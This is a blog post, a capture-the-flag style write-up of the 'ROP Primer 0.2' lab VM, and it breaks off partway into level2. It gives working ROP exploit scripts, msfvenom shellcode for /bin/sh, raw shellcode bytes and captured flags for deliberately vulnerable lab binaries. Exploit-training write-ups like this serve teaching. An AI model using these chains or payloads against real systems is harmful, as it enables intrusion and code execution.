
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>ROP Primer: 0.2 - tcunha.github.io</title>
  <meta name="author" content="tcunha">

  
  <meta name="description" content="level0 Started, as usual, by fetching the number of characters needed to overflow the
name. The regular MSF pattern-create (or its alternatives like &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://tcunha.github.io/blog/2015/11/12/rop-primer-0-dot-2/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="tcunha.github.io" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">tcunha.github.io</a></h1>
  
    <h2>The lesson of history is that no one learns.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="tcunha.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">ROP Primer: 0.2</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-11-12T01:31:07+00:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>12</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:31 am</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><h2>level0</h2>

<p>Started, as usual, by fetching the number of characters needed to overflow the
name. The regular MSF pattern-create (or its alternatives like peda) approach
can be used. In this case consider that 44 bytes are needed to overflow.</p>

<p>The system(3) function doesn&rsquo;t seem to be linked in the library. On purpose,
most likely. One can use the mprotect(2) system call to bypass the NX protection
(which isn&rsquo;t allowed under PaX) on the stack by making a small portion of its
pages as executable and read a shellcode into that location from standard input.</p>

<p>The Python code below was used to create two additional (fake) stack frames:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">44</span>
</span><span class='line'>
</span><span class='line'><span class="n">mprotectaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080523e0</span><span class="p">)</span>
</span><span class='line'><span class="n">pop3</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048882</span><span class="p">)</span>
</span><span class='line'><span class="n">mprotectarg1</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbffdf000</span><span class="p">)</span> <span class="c"># Stack address.</span>
</span><span class='line'><span class="n">mprotectlen</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>       <span class="c"># Address length.</span>
</span><span class='line'><span class="n">mprotectflgs</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x7</span><span class="p">)</span>        <span class="c"># PROT_READ|PROT_WRITE|PROT_EXEC</span>
</span><span class='line'>
</span><span class='line'><span class="n">readaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080517f0</span><span class="p">)</span>
</span><span class='line'><span class="n">readfd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>              <span class="c"># Read from standard input.</span>
</span><span class='line'><span class="n">readbuf</span> <span class="o">=</span> <span class="n">mprotectarg1</span>
</span><span class='line'><span class="n">readcnt</span> <span class="o">=</span> <span class="n">mprotectlen</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">mprotectaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">mprotectarg1</span> <span class="o">+</span> <span class="n">mprotectlen</span> <span class="o">+</span> <span class="n">mprotectflgs</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">readfd</span> <span class="o">+</span> <span class="n">readbuf</span> <span class="o">+</span> <span class="n">readcnt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readbuf</span>                    <span class="c"># Jump to the marked stack area.</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>The (not encoded) shellcode was generated using msfvenom:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> msfvenom -p linux/x86/exec -f py <span class="nv">CMD</span><span class="o">=</span>/bin/sh 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>    <span class="se">\</span>
</span><span class='line'><span class="go">    tail -n+6|                                          \</span>
</span><span class='line'><span class="go">    sed -e &#39;s,buf += &quot;,,&#39; -e &#39;s,&quot;,,g&#39;|                  \</span>
</span><span class='line'><span class="go">    tr -d &#39;\n&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And, finally, executed with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level0@rop:~$</span> <span class="o">(</span>python boom.py<span class="p">;</span> python -c <span class="s1">&#39;print &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80&quot;&#39;</span><span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>/home/level0/level0
</span><span class='line'><span class="go">[+] ROP tutorial level0</span>
</span><span class='line'><span class="go">[+] What&#39;s your name? [+] Bet you can&#39;t ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#!</span>
</span><span class='line'><span class="go">cat flag</span>
</span><span class='line'><span class="go">flag{rop_the_night_away}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>level1</h2>

<p>This first needs some code analysis to figure out where exactly the overflow
occurs. The issue here is that the (specified) file&rsquo;s size (and therefore under
control) is also being used when reading its (path) name from the socket:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">32</span><span class="p">],</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'><span class="kt">char</span> <span class="n">text</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
</span><span class='line'><span class="kt">int</span> <span class="n">read_bytes</span><span class="p">,</span> <span class="n">filesize</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="n">str_filesize</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="p">[...]</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* Read the file size from the socket. */</span>
</span><span class='line'><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">str_filesize</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
</span><span class='line'><span class="n">filesize</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">str_filesize</span><span class="p">);</span>
</span><span class='line'><span class="kt">char</span> <span class="o">*</span><span class="n">filebuf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">filesize</span><span class="p">);</span> <span class="o">&lt;---------------------+</span>
</span><span class='line'>                                                        <span class="o">|</span>
</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot; Please, send your file:</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>          <span class="o">|</span>
</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;&gt; &quot;</span><span class="p">);</span>                                    <span class="o">|</span> <span class="n">related</span>
</span><span class='line'>                                                        <span class="o">|</span> <span class="n">to</span>
</span><span class='line'><span class="cm">/* Read the file of size filesize. */</span>                   <span class="o">|</span>
</span><span class='line'><span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">filebuf</span><span class="p">,</span> <span class="n">filesize</span><span class="p">);</span> <span class="o">&lt;-------------+</span>
</span><span class='line'>                                                        <span class="o">|</span>
</span><span class='line'><span class="p">[...]</span>                                                   <span class="o">|</span>
</span><span class='line'>                                                        <span class="o">|</span>
</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot; Please, give a filename:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>           <span class="o">|</span> <span class="n">not</span>
</span><span class='line'><span class="n">write_buf</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;&gt; &quot;</span><span class="p">);</span>                                    <span class="o">|</span> <span class="n">related</span>
</span><span class='line'>                                                        <span class="o">|</span> <span class="n">to</span>
</span><span class='line'><span class="cm">/* Read the file name from the socket. */</span>               <span class="o">|</span>
</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">));</span>                  <span class="o">|</span>
</span><span class='line'><span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">filesize</span><span class="p">);</span> <span class="o">&lt;------------+</span>
</span></code></pre></td></tr></table></div></figure>


<p>One can give a filesize of 128 bytes but provide a bigger filename (which is
fixed at 32 bytes of size). The read(2) call should have been:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">read_bytes</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="n">filename</span><span class="p">[</span><span class="n">read_bytes</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Keep in mind the file descriptor count of the child process:</p>

<pre><code> parent
+------+
| 0    | =&gt; stdin
| 1    | =&gt; stdout
| 2    | =&gt; stderr
| 3    | =&gt; listenfd
| 4    | =&gt; connfd (closed in the while loop before the accept call)
+------+

 child
+------+
| 0    | =&gt; stdin
| 1    | =&gt; stdout
| 2    | =&gt; stderr
| 3    | =&gt; flag file fd (previously listenfd, closed in main; freed)
| 4    | =&gt; connfd
+------+
</code></pre>

<p>Then, the addresses of the open(2), read(2) and write(2) that are used by the
binary in the PLT section were retrieved:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='objdump'><span class='line'><span class="x">$ objdump -D level1|grep -E &quot;(open|read|write)@plt&gt;:&quot;</span>
</span><span class='line'><span class="mh">08048640</span> <span class="p">&lt;</span><span class="nf">read@plt</span><span class="p">&gt;:</span>
</span><span class='line'><span class="mh">080486d0</span> <span class="p">&lt;</span><span class="nf">open@plt</span><span class="p">&gt;:</span>
</span><span class='line'><span class="mh">08048700</span> <span class="p">&lt;</span><span class="nf">write@plt</span><span class="p">&gt;:</span>
</span></code></pre></td></tr></table></div></figure>


<p>Followed by the address of an unused and writable section in the ELF file that
<em>can</em> (data section has eight bytes only) and will hold the contents of the flag
file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> readelf -S level1<span class="p">|</span>grep WA
</span><span class='line'><span class="go">[19] .init_array       INIT_ARRAY      0804a2f8 0012f8 000004 00  WA  0   0  4</span>
</span><span class='line'><span class="go">[20] .fini_array       FINI_ARRAY      0804a2fc 0012fc 000004 00  WA  0   0  4</span>
</span><span class='line'><span class="go">[21] .jcr              PROGBITS        0804a300 001300 000004 00  WA  0   0  4</span>
</span><span class='line'><span class="go">[22] .dynamic          DYNAMIC         0804a304 001304 0000f0 08  WA  7   0  4</span>
</span><span class='line'><span class="go">[23] .got              PROGBITS        0804a3f4 0013f4 000004 04  WA  0   0  4</span>
</span><span class='line'><span class="go">[24] .got.plt          PROGBITS        0804a3f8 0013f8 00006c 04  WA  0   0  4</span>
</span><span class='line'><span class="go">[25] .data             PROGBITS        0804a464 001464 000008 00  WA  0   0  4</span>
</span><span class='line'><span class="go">[26] .bss              NOBITS          0804a46c 00146c 000004 00  WA  0   0  4</span>
</span></code></pre></td></tr></table></div></figure>


<p>0xf0 bytes is more than enough to hold the 53 bytes of the file. Since the
binary also has the flag character array (NUL terminated), its address can be
used, instead:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='objdump'><span class='line'><span class="x"># if (strstr(filename, &quot;flag&quot;)) &lt;== This one here.</span>
</span><span class='line'><span class="x">$ objdump -s -j .rodata level1|grep flag</span>
</span><span class='line'><span class="x">8049128 666c6167 00000000 20205845 52584553  flag....  XERXES</span>
</span></code></pre></td></tr></table></div></figure>


<p>As for the exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">64</span>
</span><span class='line'><span class="n">pop2</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048ef7</span><span class="p">)</span>
</span><span class='line'><span class="n">pop3</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048ef6</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">openaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080486d0</span><span class="p">)</span> <span class="c"># open@plt</span>
</span><span class='line'><span class="n">openpath</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08049128</span><span class="p">)</span> <span class="c"># The flag string in the data section.</span>
</span><span class='line'><span class="n">openflgs</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>        <span class="c"># O_RDONLY.</span>
</span><span class='line'>
</span><span class='line'><span class="n">readaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048640</span><span class="p">)</span> <span class="c"># read@plt</span>
</span><span class='line'><span class="n">readfd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">)</span>          <span class="c"># Read from the newly created descriptor.</span>
</span><span class='line'><span class="n">readbuf</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0804a304</span><span class="p">)</span>  <span class="c"># Read contents to the dynamic section.</span>
</span><span class='line'><span class="n">readcnt</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">)</span>        <span class="c"># Size of the dynamic ELF section.</span>
</span><span class='line'>
</span><span class='line'><span class="n">writeaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048700</span><span class="p">)</span> <span class="c"># write@plt</span>
</span><span class='line'><span class="n">writefd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">)</span>          <span class="c"># Write to the original socket file descriptor.</span>
</span><span class='line'><span class="n">writebuf</span> <span class="o">=</span> <span class="n">readbuf</span>
</span><span class='line'><span class="n">writecnt</span> <span class="o">=</span> <span class="n">readcnt</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">openaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">openpath</span> <span class="o">+</span> <span class="n">openflgs</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">readfd</span> <span class="o">+</span> <span class="n">readbuf</span> <span class="o">+</span> <span class="n">readcnt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">writeaddr</span> <span class="o">+</span> <span class="s">&quot;BOOM&quot;</span> <span class="o">+</span> <span class="n">writefd</span> <span class="o">+</span> <span class="n">writebuf</span> <span class="o">+</span> <span class="n">writecnt</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;192.168.56.101&quot;</span><span class="p">,</span> <span class="mi">8888</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># Banner.</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;store&quot;</span><span class="p">)</span>     <span class="c"># The internal application command.</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># How many bytes in your file?</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;128&quot;</span><span class="p">)</span>       <span class="c"># Must be bigger than the 32 bytes of the filename.</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># Please send your file (the contents).</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;boom&quot;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># Error treatment and filename.</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;exit&quot;</span><span class="p">)</span>      <span class="c"># The internal application command.</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>  <span class="c"># To get the contents of the flag file.</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>At last, called the above Python code to remotely extract the contents of the
file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> python boom.py
</span><span class='line'><span class="go">Welcome to </span>
</span><span class='line'>
</span><span class='line'><span class="go"> XERXES File Storage System</span>
</span><span class='line'><span class="go">  available commands are:</span>
</span><span class='line'><span class="go">  store, read, exit.</span>
</span><span class='line'>
</span><span class='line'><span class="gp">&gt;</span>
</span><span class='line'><span class="go"> Please, how many bytes is your file?</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="gp">&gt;</span>
</span><span class='line'><span class="go"> Please, send your file:</span>
</span><span class='line'>
</span><span class='line'><span class="gp">&gt;</span>
</span><span class='line'><span class="go">   XERXES regrets to inform you</span>
</span><span class='line'><span class="go">    that an error occurred</span>
</span><span class='line'><span class="go">        while receiving your file.</span>
</span><span class='line'><span class="go"> Please, give a filename:</span>
</span><span class='line'><span class="gp">&gt;</span> flag<span class="o">{</span>just_one_rop_chain_a_day_keeps_the_doctor_away<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<h2>level2</h2>

<p>The bad characters list should be enumerated by sending them in sequence, firing
up gdb and checking the stack values. For instance:</p>

<pre><code>gdb-peda$ x/64x $esp
0xbffff5c0:   0x04030201      0x08070605      0xbffff600      0x00000000
                                ^^^^^^^^
                                no \x09
</code></pre>

<p>Then, it is a matter of choosing the correct gadgets by taking into account the
above bad characters. Decided by using the already present strcpy(3) function in
the binary and copy the /bin/sh character array (character by character) to the
BSS segment and using a gadget to store a NUL byte by zeroing the eax register
first and using a mov instruction.</p>

<p>Since this is running Linux x86, one can take advantage of the interrupt gadget
by moving into eax the execve system call number and into ebx the address of the
/bin/sh character array (which is in the BSS section).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
